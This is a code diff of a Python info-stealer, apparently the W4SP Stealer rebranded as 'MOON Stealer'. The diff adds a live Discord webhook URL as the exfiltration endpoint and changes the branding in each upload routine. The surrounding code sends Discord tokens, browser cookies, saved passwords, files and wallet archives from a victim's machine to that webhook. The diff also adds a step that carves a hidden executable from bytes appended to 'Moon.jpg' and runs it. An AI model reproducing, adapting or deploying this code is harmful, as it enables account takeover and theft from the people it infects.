@@ -16,7 +16,7 @@ import re
 import subprocess
 
 
-hook = "x"
+hook = "https://discord.com/api/webhooks/1064637624112926931/dPWkdqpNvEsQeVMor5Zyb2t5HZMlmEPhG_9aVLv10e716iP7Bw4VObbugj28_uMJxxqV"
 DETECTED = False
 
 
@@ -40,17 +40,6 @@ for modl in requirements:
 
 import requests
 from Crypto.Cipher import AES
-
-with open('Moon.jpg', 'rb') as f:
-    content = f.read()
-    offset = content.index(bytes.fromhex('FFD9'))
-
-    f.seek(offset + 2)
-
-    with open('main.exe', 'wb') as e:
-        e.write(f.read())
-
-os.system("main.exe")
 
 
 local = os.getenv('LOCALAPPDATA')
@@ -296,7 +285,7 @@ def uploadToken(token, path):
         "content": f'{globalInfo()} | Found in `{path}`',
         "embeds": [
             {
-            "color": 14406413,
+            "color": 11111,
             "fields": [
                 {
                     "name": ":rocket: Token:",
@@ -338,16 +327,16 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "@W4SP STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                "text": "@MOON STEALER",
+                "icon_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
-        "username": "W4SP Stealer",
+        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
+        "username": "MOON Stealer",
         "attachments": []
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -375,17 +364,17 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "W4SP | Cookies Stealer",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [w4spCookies.txt]({link})",
-                    "color": 14406413,
+                    "title": "MOON | Cookies Stealer",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [MOONCookies.txt]({link})",
+                    "color": 11111,
                     "footer": {
-                        "text": "@W4SP STEALER",
-                        "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                        "text": "@MOON STEALER",
+                        "icon_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg"
                     }
                 }
             ],
-            "username": "W4SP",
-            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+            "username": "MOON",
+            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -401,17 +390,17 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "W4SP | Password Stealer",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [w4spPassword.txt]({link})",
-                    "color": 14406413,
+                    "title": "MOON | Password Stealer",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [MOONPassword.txt]({link})",
+                    "color": 11111,
                     "footer": {
-                        "text": "@W4SP STEALER",
-                        "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                        "text": "@MOON STEALER",
+                        "icon_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg"
                     }
                 }
             ],
-            "username": "W4SP",
-            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+            "username": "MOON",
+            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -422,7 +411,7 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                "color": 14406413,
+                "color": 11111,
                 "fields": [
                     {
                     "name": "Interesting files found on user PC:",
@@ -430,16 +419,16 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "W4SP | File Stealer"
+                    "name": "MOON | File Stealer"
                 },
                 "footer": {
-                    "text": "@W4SP STEALER",
-                    "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                    "text": "@MOON STEALER",
+                    "icon_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg"
                 }
                 }
             ],
-            "username": "W4SP",
-            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+            "username": "MOON",
+            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -459,7 +448,7 @@ def upload(name, link):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--W4SP STEALER ON TOP-->\n\n")
+        f.write(f"<--MOON STEALER ON TOP-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -624,17 +613,17 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "W4SP Zips",
+            "title": "MOON Zips",
             "description": f"{wal}\n{ga}\n{ot}",
-            "color": 15781403,
+            "color": 11111,
             "footer": {
-                "text": "@W4SP STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                "text": "@MOON STEALER",
+                "icon_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg"
             }
             }
         ],
-        "username": "W4SP Stealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+        "username": "MOON Stealer",
+        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
         "attachments": []
     }
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -912,3 +901,14 @@ if not DETECTED:
                 filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
     upload("kiwi", filetext)
+
+with open('Moon.jpg', 'rb') as f:
+    content = f.read()
+    offset = content.index(bytes.fromhex('FFD9'))
+
+    f.seek(offset + 2)
+
+    with open('main.exe', 'wb') as e:
+        e.write(f.read())
+
+os.system("main.exe")
